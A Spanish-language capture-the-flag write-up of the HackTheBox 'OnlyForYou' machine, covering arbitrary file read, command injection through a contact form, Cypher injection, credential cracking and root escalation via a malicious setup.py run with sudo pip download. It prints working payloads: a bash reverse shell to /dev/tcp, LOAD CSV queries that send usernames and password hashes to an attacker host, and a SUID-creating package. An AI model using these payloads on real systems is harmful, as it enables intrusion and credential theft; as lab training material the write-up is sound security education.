@@ -1,0 +1,575 @@
+---
+title: "Máquina OnlyForYou"
+description: "Resolución de la máquina Only4You de HackTheBox"
+categories: ["HackTheBox", "Medium", "Linux"]
+logo: '/assets/writeups/only4you/logo.png'
+tags: ["Arbitrary File Read", "Command Injection", "Cypher Injection", "pip"]
+---
+
+Nos encontramos con un sitio de un equipo con un subdominio que contiene una ruta vulnerable a lectura de archivos arbitraria, usaremos esta vulnerabilidad para leer el código del aplicativo y encontrar una vulnerabilidad de inyección de comandos, dentro de la máquina estará un servicio web interno que es vulnerable a una inyección del lenguaje de consultas usado por Neo4J. Finalmente obteniendo credenciales con la vulnerabilidad anteriormente mencionada escalaremos privilegios abusando de un permiso especial para ejecutar el comando `pip download` como root.
+
+## Reconocimiento
+
+La máquina tiene solo dos puertos abiertos.
+
+```bash
+# Nmap 7.94 scan initiated Thu Aug 24 15:28:49 2023 as: nmap -sS -Pn -n -vvv -p- --open -oN ports --min-rate 500 10.10.11.210
+Nmap scan report for 10.10.11.210
+Host is up, received user-set (3.8s latency).
+Scanned at 2023-08-24 15:28:49 -04 for 163s
+Not shown: 60198 closed tcp ports (reset), 5335 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Thu Aug 24 15:31:32 2023 -- 1 IP address (1 host up) scanned in 162.93 seconds
+```
+
+El puerto 80 nos redirige al dominio "only4you.htb", vamos a agregarlo a nuestro `/etc/hosts`
+
+```bash
+❯ whatweb http://10.10.11.210
+http://10.10.11.210 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.210], RedirectLocation[http://only4you.htb/], Title[301 Moved Permanently], nginx[1.18.0]
+ERROR Opening: http://only4you.htb/ - no address for only4you.htb
+```
+
+Viéndolo de cerca, parece un simple sitio de un equipo de desarrolladores free-lancers, han tenido clientes y han recibido premios... en las FAQs del sitio aclaran tener un equipo de pentesters que verifican los productos y también tienen un producto en beta para probar bajo el subdominio `beta.only4you.htb` 
+
+![FAQ](/assets/writeups/only4you/1.png)
+
+Este sitio web en beta parece funcionar para cambiarle el tamaño a las imágenes y convertirlas a formatos diferentes. También te permite descargar el código fuente del aplicativo para analizarlo
+
+![Beta](/assets/writeups/only4you/2.png)
+
+Vamos a ver el código fuente a ver que hayamos.
+
+## Intrusión
+
+### www-data - only4you.htb
+
+Es una aplicación Flask con distintas rutas, pero hay algo que llama la atención y es que la ruta download parece vulnerable a Arbitrary File Read, aunque esté filtrando por carácteres de navegación de directorios la función de normalización del posixpath solamente normaliza la ruta a una absoluta y el `path#join` es solamente aplicado si la ruta no es absoluta.
+
+```python
+@app.route('/download', methods=['POST'])
+def download():
+    image = request.form['image']
+    filename = posixpath.normpath(image) 
+    if '..' in filename or filename.startswith('../'):
+        flash('Hacking detected!', 'danger')
+        return redirect('/list')
+    if not os.path.isabs(filename):
+        filename = os.path.join(app.config['LIST_FOLDER'], filename)
+    try:
+        if not os.path.isfile(filename):
+            flash('Image doesn\'t exist!', 'danger')
+            return redirect('/list')
+    except (TypeError, ValueError):
+        raise BadRequest()
+    return send_file(filename, as_attachment=True)
+```
+
+Si probamos a introducir `/etc/passwd` en el parámetro de la imágen, ¡nos lo devuelve!
+
+```bash
+❯ curl -v -d "image=/etc/passwd" http://beta.only4you.htb/download
+*   Trying 10.10.11.210:80...
+* Connected to beta.only4you.htb (10.10.11.210) port 80 (#0)
+> POST /download HTTP/1.1
+> Host: beta.only4you.htb
+> User-Agent: curl/8.1.2
+> Accept: */*
+> Content-Length: 17
+> Content-Type: application/x-www-form-urlencoded
+> 
+< HTTP/1.1 200 OK
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Thu, 24 Aug 2023 19:59:14 GMT
+< Content-Type: application/octet-stream
+< Content-Length: 2079
+< Connection: keep-alive
+< Content-Disposition: attachment; filename=passwd
+< Last-Modified: Thu, 30 Mar 2023 12:12:20 GMT
+< Cache-Control: no-cache
+< ETag: "1680178340.2049809-2079-393413677"
+< 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+... [snip]
+```
+
+Aunque tengamos el código fuente del aplicativo, no sabemos si contiene de verdad todos los archivos utilizados en el backend, por lo que vamos a probar por rutas en donde pueda estar el `app.py` de esta web... probando por `/var/www/only4you.htb/app.py` encontramos lo que parece ser el código de la página web principal (only4you.htb)
+
+```python
+from flask import Flask, render_template, request, flash, redirect
+from form import sendmessage
+import uuid
+
+app = Flask(__name__)
+app.secret_key = uuid.uuid4().hex
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        email = request.form['email']
+        subject = request.form['subject']
+        message = request.form['message']
+        ip = request.remote_addr
+
+        status = sendmessage(email, subject, message, ip)
+        if status == 0:
+            flash('Something went wrong!', 'danger')
+        elif status == 1:
+            flash('You are not authorized!', 'danger')
+        else:
+            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
+        return redirect('/#contact')
+    else:
+        return render_template('index.html')
+
+@app.errorhandler(404)
+def page_not_found(error):
+    return render_template('404.html'), 404
+
+@app.errorhandler(500)
+def server_errorerror(error):
+    return render_template('500.html'), 500
+
+@app.errorhandler(400)
+def bad_request(error):
+    return render_template('400.html'), 400
+
+@app.errorhandler(405)
+def method_not_allowed(error):
+    return render_template('405.html'), 405
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=80, debug=False)
+```
+{: file="/var/www/only4you.htb/app.py"}
+
+Si no lo viste o no lo recuerdas, sabrás que en lo último de la página había un formulario para contactar con el equipo en cuestión, pues en este código parece usar un modulo llamado `form.py` para tratar la petición hecha con el formulario, está en el mismo lugar del app.py de hecho
+
+```python
+import smtplib, re
+from email.message import EmailMessage
+from subprocess import PIPE, run
+import ipaddress
+
+def issecure(email, ip):
+	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
+		return 0
+	else:
+		domain = email.split("@", 1)[1]
+		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
+		output = result.stdout.decode('utf-8')
+		if "v=spf1" not in output:
+			return 1
+		else:
+			domains = []
+			ips = []
+			if "include:" in output:
+				dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
+				dms.pop(0)
+				for domain in dms:
+					domains.append(domain)
+				while True:
+					for domain in domains:
+						result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
+						output = result.stdout.decode('utf-8')
+						if "include:" in output:
+							dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
+							domains.clear()
+							for domain in dms:
+								domains.append(domain)
+						elif "ip4:" in output:
+							ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
+							ipaddresses.pop(0)
+							for i in ipaddresses:
+								ips.append(i)
+						else:
+							pass
+					break
+			elif "ip4" in output:
+				ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
+				ipaddresses.pop(0)
+				for i in ipaddresses:
+					ips.append(i)
+			else:
+				return 1
+		for i in ips:
+			if ip == i:
+				return 2
+			elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
+				return 2
+			else:
+				return 1
+
+def sendmessage(email, subject, message, ip):
+	status = issecure(email, ip)
+	if status == 2:
+		msg = EmailMessage()
+		msg['From'] = f'{email}'
+		msg['To'] = 'info@only4you.htb'
+		msg['Subject'] = f'{subject}'
+		msg['Message'] = f'{message}'
+
+		smtp = smtplib.SMTP(host='localhost', port=25)
+		smtp.send_message(msg)
+		smtp.quit()
+		return status
+	elif status == 1:
+		return status
+	else:
+		return status
+
+```
+{: file="/var/www/only4you.htb/form.py"}
+
+Está verificando al principio si lo que se le pasa es una dirección de correo para luego ejecutar el comando `dig txt domain.com`, pero **solamente verifica si es algo en formato de dirección de correo**.
+
+Introduciendo lo siguiente a la petición POST al parámetro email, podremos injectar comandos:
+
+`email=test@testing.com%20$(ping -c 1 10.10.14.208)&subject=uwu&message=hellofromhacker`
+
+Enviando eso para mandarnos un ping y comprobar la ejecución, funciona de maravilla
+
+```bash
+❯ doas tshark -i tun0 icmp
+doas (vzon@pwnedz0n) password: 
+Running as user "root" and group "root". This could be dangerous.
+Capturing on 'tun0'
+ ** (tshark:35878) 16:21:07.757347 [Main MESSAGE] -- Capture started.
+ ** (tshark:35878) 16:21:07.757412 [Main MESSAGE] -- File: "/tmp/wireshark_tun0A9GDA2.pcapng"
+    1 0.000000000 10.10.11.210 → 10.10.14.208 ICMP 84 Echo (ping) request  id=0x0002, seq=1/256, ttl=63
+    2 0.000015372 10.10.14.208 → 10.10.11.210 ICMP 84 Echo (ping) reply    id=0x0002, seq=1/256, ttl=64 (request in 1)
+
+```
+
+Vamos a enviarnos una reverse shell a nuestro equipo ahora
+
+```bash
+❯ curl -v -d "email=test@testing.com%20\$(bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.14.208/443%200>%261')&subject=uwu&message=hellofromhacker" http://only4you.htb
+*   Trying 10.10.11.210:80...
+* Connected to only4you.htb (10.10.11.210) port 80 (#0)
+> POST / HTTP/1.1
+> Host: only4you.htb
+> User-Agent: curl/8.1.2
+> Accept: */*
+> Content-Length: 131
+> Content-Type: application/x-www-form-urlencoded
+> 
+```
+
+```bash
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.210 33922
+bash: cannot set terminal process group (1011): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@only4you:~/only4you.htb$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@only4you:~/only4you.htb$ ^Z
+[1]  + 36238 suspended  nc -lvnp 443
+❯ stty raw -echo; fg
+[1]  + 36238 continued  nc -lvnp 443
+                                    reset xterm
+www-data@only4you:~/only4you.htb$ export TERM=xterm-256color
+www-data@only4you:~/only4you.htb$ stty rows 36 columns 149
+www-data@only4you:~/only4you.htb$ source /etc/skel/.bashrc
+```
+
+### john - only4you.htb
+
+Mirando por puertos internos de la máquina, parece haber algo interesante
+
+```bash
+www-data@only4you:~/only4you.htb$ ss -ltup
+Netid   State    Recv-Q   Send-Q           Local Address:Port         Peer Address:Port   Process                                                    
+udp     UNCONN   0        0                127.0.0.53%lo:domain            0.0.0.0:*                                                                 
+udp     UNCONN   0        0                      0.0.0.0:bootpc            0.0.0.0:*                                                                 
+tcp     LISTEN   0        4096             127.0.0.53%lo:domain            0.0.0.0:*                                                                 
+tcp     LISTEN   0        128                    0.0.0.0:ssh               0.0.0.0:*                                                                 
+tcp     LISTEN   0        4096                 127.0.0.1:3000              0.0.0.0:*                                                                 
+tcp     LISTEN   0        2048                 127.0.0.1:8001              0.0.0.0:*                                                                 
+tcp     LISTEN   0        70                   127.0.0.1:33060             0.0.0.0:*                                                                 
+tcp     LISTEN   0        151                  127.0.0.1:mysql             0.0.0.0:*                                                                 
+tcp     LISTEN   0        511                    0.0.0.0:http              0.0.0.0:*       users:(("nginx",pid=1045,fd=6),("nginx",pid=1044,fd=6))   
+tcp     LISTEN   0        128                       [::]:ssh                  [::]:*                                                                 
+tcp     LISTEN   0        4096        [::ffff:127.0.0.1]:7687                    *:*                                                                 
+tcp     LISTEN   0        50          [::ffff:127.0.0.1]:7474                    *:*                                                      
+```
+
+Hay un puerto 3000 y otros dos que son 7687 y 7474... ¿pero de qué son?
+
+Buscando por internet sobre los últimos dos, obtenemos nuestra respuesta:
+
+![Neo4J](/assets/writeups/only4you/3.png)
+
+Mirando los procesos, si que es una instancia del servidor de base de datos [Neo4J](https://es.wikipedia.org/wiki/Neo4j). Si has utilizado bloodhound debes conocerlo. Viendo que hay otro servicio en el puerto 3000 significa que algo debe hacer con este Neo4J o el MySQL.
+
+Vamos a utilizar Chisel para hacer redirigir nuestro puerto 3000 al de la máquina con el reverse port forwading
+
+```bash
+chisel server -reverse -p 8081
+```
+{: file="Equipo atacante"}
+
+```bash
+chisel client 10.10.14.208:8081 R:3000:3000
+```
+{: file="Máquina victima"}
+
+Pero nos damos cuenta de que este servicio no tiene nada que ver con el Neo4J; es un simple servidor de [Gogs](https://gogs.io/)
+
+![Gogs](/assets/writeups/only4you/4.png)
+
+¿Entonces...? hay que seguir buscando, si miramos bien arriba hay otro servicio en el 8001 que también es HTTP utilizando gunicorn. Tendremos en cuenta a ese Gogs para luego ver que hacemos con él.
+
+```bash
+ww-data@only4you:~/only4you.htb$ curl -v http://127.0.0.1:8001
+*   Trying 127.0.0.1:8001...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8001 (#0)
+> GET / HTTP/1.1
+> Host: 127.0.0.1:8001
+> User-Agent: curl/7.68.0
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 302 FOUND
+< Server: gunicorn/20.0.4
+< Date: Thu, 24 Aug 2023 21:21:37 GMT
+< Connection: close
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 199
+< Location: /login
+< Set-Cookie: session=c6c02479-07f3-46aa-a9e2-596734297297; Expires=Thu, 24 Aug 2023 21:26:37 GMT; HttpOnly; Path=/
+< 
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+... [snip]
+```
+
+Viéndolo más de cerca, parece ser un servicio completamente distinto
+
+![Admin](/assets/writeups/only4you/5.png)
+
+Intentando utilizar contraseñas por defecto funciona, el conocido par `admin:admin` es utilizado aquí, al acceder nos muestra un panel de estadisticas y una parte para buscar empleados, interceptando la petición nos muestra esto
+
+`search=asd`
+
+Si le ponemos una comilla, el servidor mostrará un error, pero luego si intentamos introducir cualquier comando SQL conocido también nos motrará un error; sucede que esta web está utilizando el Neo4J que vimos antes y no el MySQL.
+
+Una inyección en este lenguaje nos puede facilitar más aún filtrar datos sensibles gracias a funciones como `LOAD CSV`, pero vamos a dar un poco de introducción antes: Si has leído como funciona este RDBMS debes saber que no utiliza tablas ni documentos, utiliza los conocidos grafos para almacenar datos, una query típica en este lenguaje se ve como
+
+```s
+MATCH (n: User) WHERE n.name = 'hackerman' RETURN n
+```
+
+Donde n son los nodos almacenados, User una etiqueta de datos y `name` es una propiedad.
+
+Hay varias cosas que podemos intentar sacar, empezando por las llamadas labels existentes en la base de datos, investigando por la documentación oficial de Cypher y por otras páginas podemos armarnos una query como esta
+
+```bash
+# MATCH (n: Employee) WHERE n.name = '' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.208:8000/?uwu=' + label AS l RETURN 0 AS _0 // RETURN n
+search='+OR+1%3d1+WITH+1+as+a+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'http%3a//10.10.14.208:8000/%3fuwu%3d'+%2b+label+as+l+RETURN+0+as+_0+//
+```
+
+Teniendo un servidor HTTP en el puerto 8000, recibimos las siguientes peticiones:
+
+```bash
+... [snip]
+10.10.11.210 - - [24/Aug/2023 18:21:53] "GET /?uwu=user HTTP/1.1" 200 -
+10.10.11.210 - - [24/Aug/2023 18:21:53] "GET /?uwu=employee HTTP/1.1" 200 -
+10.10.11.210 - - [24/Aug/2023 18:21:54] "GET /?uwu=user HTTP/1.1" 200 -
+10.10.11.210 - - [24/Aug/2023 18:21:54] "GET /?uwu=employee HTTP/1.1" 200 -
+10.10.11.210 - - [24/Aug/2023 18:21:54] "GET /?uwu=user HTTP/1.1" 200 -
+10.10.11.210 - - [24/Aug/2023 18:21:55] "GET /?uwu=employee HTTP/1.1" 200 -
+10.10.11.210 - - [24/Aug/2023 18:21:55] "GET /?uwu=user HTTP/1.1" 200 -
+10.10.11.210 - - [24/Aug/2023 18:21:55] "GET /?uwu=employee HTTP/1.1" 200 -
+10.10.11.210 - - [24/Aug/2023 18:21:55] "GET /?uwu=user HTTP/1.1" 200 -
+10.10.11.210 - - [24/Aug/2023 18:21:56] "GET /?uwu=employee HTTP/1.1" 200 -
+... [snip]
+```
+
+Estos son los tipos de datos existentes dentro del Neo4J, el de user llama la atención asi que vamos a sacar nombres; el nombre de la propiedad probablemente sea `username` o `name`, probando por la primera obtenemos resultados
+
+```bash
+# MATCH (n: Employee) WHERE n.name = '' OR 1=1 WITH 1 as a MATCH(u: user) UNWIND u.username AS name LOAD CSV FROM 'http://10.10.14.208:8000/?uwu=' + name AS l RETURN 0 AS _0 // RETURN n
+search='+OR+1%3d1+WITH+1+as+a+MATCH+(u%3a+user)+UNWIND+u.username+AS+name+LOAD+CSV+FROM+'http%3a//10.10.14.208:8000/%3fuwu%3d'+%2b+name+as+l+RETURN+0+//
+```
+
+```bash
+... [snip]
+10.10.11.210 - - [24/Aug/2023 18:36:40] "GET /?uwu=admin HTTP/1.1" 200 -
+10.10.11.210 - - [24/Aug/2023 18:36:40] "GET /?uwu=john HTTP/1.1" 200 -
+... [snip]
+```
+
+Otro usuario, si probamos por un campo de contraseña `password` obtenemos hashes de tipo SHA2-256...
+
+```bash
+10.10.11.210 - - [24/Aug/2023 18:41:28] "GET /?uwu=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
+10.10.11.210 - - [24/Aug/2023 18:41:29] "GET /?uwu=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
+```
+
+El de primero es el de admin y el segundo de john, ambos son crackeables y logramos hacerlo en segundos. 
+
+```bash
+a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6:ThisIs4You
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1400 (SHA2-256)
+Hash.Target......: a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4...1c55f6
+Time.Started.....: Thu Aug 24 18:44:54 2023 (10 secs)
+Time.Estimated...: Thu Aug 24 18:45:04 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1005.1 kH/s (0.42ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digsests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 10539008/14344384 (73.47%)
+Rejected.........: 0/10539008 (0.00%)
+Restore.Point....: 10536960/14344384 (73.46%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: Tiffany93 -> Thelink
+Hardware.Mon.#1..: Temp: 71c Util: 70%
+
+Started: Thu Aug 24 18:44:27 2023
+Stopped: Thu Aug 24 18:45:05 2023
+```
+
+Accediendo por SSH con esta contraseña como el usuario john o utilizando `su` en nuestra shell como www-data logramos acceder, y ya podremos ver la primera flag.
+
+```bash
+❯ /usr/bin/ssh john@only4you.htb
+john@only4you.htb password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 24 Aug 2023 10:47:59 PM UTC
+
+  System load:  0.01              Processes:             274
+  Usage of /:   82.6% of 6.23GB   Users logged in:       0
+  Memory usage: 42%               IPv4 address for eth0: 10.10.11.210
+  Swap usage:   0%
+
+
+ * Introducing Expanded Security Maintenance for Applications.
+   Receive updates to over 25,000 software packages with your
+   Ubuntu Pro subscription. Free for personal use.
+
+     https://ubuntu.com/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Tue Apr 18 07:46:32 2023 from 10.10.14.40
+john@only4you:~$ ls
+user.txt
+john@only4you:~$ cat user.txt
+ed206380066cb5a70c399234fd******
+```
+
+## Escalada de privilegios
+
+Mirando los permisos especiales que tenemos, encontramos esto:
+
+```bash
+john@only4you:~$ sudo -l
+Matching Defaults entries for john on only4you:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on only4you:
+    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
+```
+
+¿Recuerdas el Gogs que vimos antes?, pues bueno, podemos usar el comando `pip download` para bajarnos de ahí cualquier tar.gz que haya en un repositorio; este comando de pip busca por un `setup.py` en el archivo para analizarlo, al analizarlo obviamente ejecuta código asi que, si logramos subir un proyecto pip comprimido a un repositorio del Gogs podremos ejecutar código Python como root.
+
+Pero para esto necesitamos estar autenticados, afortunadamente las credenciales que obtuvimos antes funcionan acá también, se reutilizan.
+
+![Gogs](/assets/writeups/only4you/6.png)
+
+Hay un repositorio llamado test el cual nos pertenece, vamos a crear un simple `setup.py` malicioso con el siguiente contenido, para luego comprimirlo y subirlo
+
+```python
+import setuptools
+import os
+
+os.system("cp /bin/bash /tmp/a && chmod u+s /tmp/a")
+
+setuptools.setup(
+    name="uwu",
+    description="Nothing OwO",
+    version="1.0.0",
+    author="nobody"
+)
+```
+
+Luego lo comprimimos con un `tar -czf package.tar.gz <directorio>` y lo subimos al Gogs, debemos poner el repositorio como público luego para poder descargar el fichero sin necesidad de autenticación en la pestaña de `Configuración -> Opciones -> Visibilidad`. Al hacerlo copiamos el link `Raw` del fichero y lo introducimos con el comando
+
+```bash
+john@only4you:~/.cache$ sudo -u root /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/uwu-package.tar.gz
+Collecting http://127.0.0.1:3000/john/Test/raw/master/uwu-package.tar.gz
+  Downloading http://127.0.0.1:3000/john/Test/raw/master/uwu-package.tar.gz (312 bytes)
+  Saved ./uwu-package.tar.gz
+Successfully downloaded uwu
+```
+
+Como lo especificamos en el `setup.py`, al mirar el directorio `/tmp` encontramos nuestro fichero "a" con el bit SUID puesto
+
+```bash
+john@only4you:~/.cache$ ls -la /tmp
+total 1384
+drwxrwxrwt 19 root  root     4096 Aug 25 20:44 .
+drwxr-xr-x 17 root  root     4096 Mar 30 11:51 ..
+-rwsr-xr-x  1 root  root  1183448 Aug 25 20:44 a
+drwxrwxrwt  2 root  root     4096 Aug 25 17:12 .font-unix
+drwxr-xr-x  2 neo4j neo4j    4096 Aug 25 17:12 hsperfdata_neo4j
+drwxrwxrwt  2 root  root     4096 Aug 25 17:12 .ICE-unix
+drwx------  2 neo4j neo4j    4096 Aug 25 17:13 jetty-localhost-7474-neo4j-browser-5_4_0_jar-_browser-any-15346138888253590193
+-rw-r--r--  1 neo4j neo4j  154886 Aug 25 17:13 liblz4-java-2947258094398385522.so
+-rw-r--r--  1 neo4j neo4j       0 Aug 25 17:13 liblz4-java-2947258094398385522.so.lck
+drwx------  2 root  root     4096 Aug 25 20:30 pip-req-build-6399vkih
+drwx------  2 root  root     4096 Aug 25 20:39 pip-req-build-nci_drxu
+drwx------  2 root  root     4096 Aug 25 20:33 pip-req-build-qttp2b50
+drwx------  2 root  root     4096 Aug 25 20:38 pip-req-build-w2hgxoop
+drwx------  3 root  root     4096 Aug 25 17:12 systemd-private-827e1811966947b29f97e75b7689cae8-gogs.service-16t3Rh
+drwx------  3 root  root     4096 Aug 25 17:12 systemd-private-827e1811966947b29f97e75b7689cae8-ModemManager.service-MjPfYg
+drwx------  3 root  root     4096 Aug 25 17:12 systemd-private-827e1811966947b29f97e75b7689cae8-systemd-logind.service-Jvpaph
+drwx------  3 root  root     4096 Aug 25 17:12 systemd-private-827e1811966947b29f97e75b7689cae8-systemd-resolved.service-uTOiBg
+drwx------  3 root  root     4096 Aug 25 17:12 systemd-private-827e1811966947b29f97e75b7689cae8-systemd-timesyncd.service-BCT37g
+drwxrwxrwt  2 root  root     4096 Aug 25 17:12 .Test-unix
+drwx------  2 root  root     4096 Aug 25 17:13 vmware-root_833-3979642945
+drwxrwxrwt  2 root  root     4096 Aug 25 17:12 .X11-unix
+drwxrwxrwt  2 root  root     4096 Aug 25 17:12 .XIM-unix
+```
+
+Ya con eso podremos tomar la última flag.
+
+```bash
+john@only4you:~/.cache$ /tmp/a -p
+a-5.0# cd /root
+a-5.0# ls
+root.txt  scripts
+a-5.0# cat root.txt
+8bb9996010c96880cc1f726988******
+```
